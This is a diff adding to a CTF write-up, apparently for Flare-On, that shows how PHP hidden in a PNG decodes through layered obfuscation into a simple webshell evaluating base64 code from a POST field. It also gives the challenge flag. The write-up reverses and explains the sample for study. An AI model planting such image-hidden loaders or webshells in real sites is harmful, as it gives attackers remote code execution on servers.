@@ -18,7 +18,7 @@ draft: false
 
 # Challenge 1 - Bob Doge
 
-## Stage 1 Analysis
+## Stage 1 Extracting CAB File
 ### Initial Triage
 
 - File Type: PE32+ executable for MS Windows 5.02 (GUI), x86-64, 6 sections
@@ -47,7 +47,7 @@ Extracting cabinet: C1.exe.defused
 All done, no errors.
 ```
 
-## Stage 2 Analysis
+## Stage 2 Analysis of .NET Sample
 
 ### Initial Triage
 
@@ -263,3 +263,128 @@ if __name__ == '__main__':
     main()
 ```
 
+# Challenge 2: Javascrap
+
+## Stage 0 Character Table Construction
+
+### Initial Triage
+
+- Challenge Type: Reverse-Engineering / Web / Obfuscated Code
+- Files Provided:
+    - `home.html`
+	    - File Type: home.html: HTML document, Unicode text, UTF-8 text, with very long lines (1428), with CRLF line terminators
+		- Size: 8.17 KB
+		- SHA256: d1b235e49336c2e510100bd3ffa3113d9c757ffb4829e9564597dbab8338b710
+    - `img/flare-on.png` (PNG image) 
+	    - File Type: img/flare-on.png: PNG image data, 400 x 79, 8-bit/color RGBA, non-interlaced
+		- Size: 9.33 KB
+		- SHA256: 87528d13f40b51b6de90124fb92bcbc38a54e5241cd7ef969208c0707ed893dd
+
+### Basic Static Analysis:
+
+- The PNG is being **included as PHP code** via an `include` in the HTML page: i.e., the challenge hides a PHP script inside what looks like an image.
+
+![Pasted image 20260119201225.png](images/Pasted_image_20260119201225.png)
+
+- Performing strings on `flare-on.png` reveals appended PHP source code instead of pure image data.
+
+![Pasted image 20260119201531.png](images/Pasted_image_20260119201531.png)
+
+- The appended PHP contains two large arrays: `$terms` and `$order`, and a reconstruction loop that builds a second PHP script dynamically. 
+
+## Stage 1: Obfuscation Decoding
+
+### 1: Character Table Reconstruction
+
+The embedded PHP begins:
+
+![Pasted image 20260119202546.png](images/Pasted_image_20260119202546.png)
+
+```php
+$terms = array("M","Z","]","p",...,"|");
+$order = array(59,71,73,13,...,47);
+$do_me="";
+for($i=0;$i<count($order);$i++){
+    $do_me=$do_me.$terms[$order[$i]];
+}
+print($do_me);
+```
+
+- `$terms` is a **custom character lookup table** - each entry is a single character.
+- `$order` is a list of integers, each an index into `$terms`. 
+- The loop concatenates `$terms[$order[i]]` to form a complete PHP script string in `$do_me`. 
+- Instead of running `eval()` immediately, you can replace it with `print` to **dump the generated code** for analysis. 
+
+## Stage 2: Second-Layer Decoding
+
+After reconstructing the inner PHP, the output looks like:
+
+![Pasted image 20260119202723.png](images/Pasted_image_20260119202723.png)
+
+```php
+$_  = 'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlc ...';
+$__ = 'JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7';
+$___ = "\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";
+eval($___($__));
+```
+
+- `$_` and `$__` are **Base64-encoded** strings. 
+- `$___` is obfuscated with **hex escape sequences** representing the string `base64_decode`. 
+- `eval($___($__))` resolves to:
+
+```php
+$code = base64_decode($_);
+eval($code);
+```
+
+This decodes the next stage of the script and executes it. 
+
+## Stage 3: Escaped Payload Interpretation
+
+![Pasted image 20260119202813.png](images/Pasted_image_20260119202813.png)
+
+The inner decoded PHP is:
+
+```php
+if (isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F..."])){
+    eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104..."]));
+}
+```
+
+- The `$_POST` key names are obfuscated using a **mix of octal (`\NNN`) and hex (`\xNN`) escapes**. 
+- To understand the actual identifier, all escape sequences must be converted into ASCII. 
+
+## Stage 4: Normalization and Flag Extraction
+
+![Pasted image 20260119202842.png](images/Pasted_image_20260119202842.png)
+
+The decoded sequence:
+
+```
+a11DOTthatDOTjava5crapATflareDASHonDOTcom
+```
+
+comes from interpreting those escape sequences as numbers and converting them to characters.   
+Replace placeholder tokens:
+
+- `DOT` → `.`
+- `AT` → `@`
+- `DASH` → `-`
+
+- Final flag:
+
+```yml
+a11.that.java5crap@flare-on.com
+```
+
+## Final Behavior
+
+The decoded PHP callback becomes:
+
+```php
+if (isset($_POST["a11.that.java5crap@flare-on.com"])) {
+    eval(base64_decode($_POST["a11.that.java5crap@flare-on.com"]));
+}
+```
+
+- This is a **simple PHP webshell** that executes Base64-encoded PHP from an HTTP POST field if sent under the correct key. 
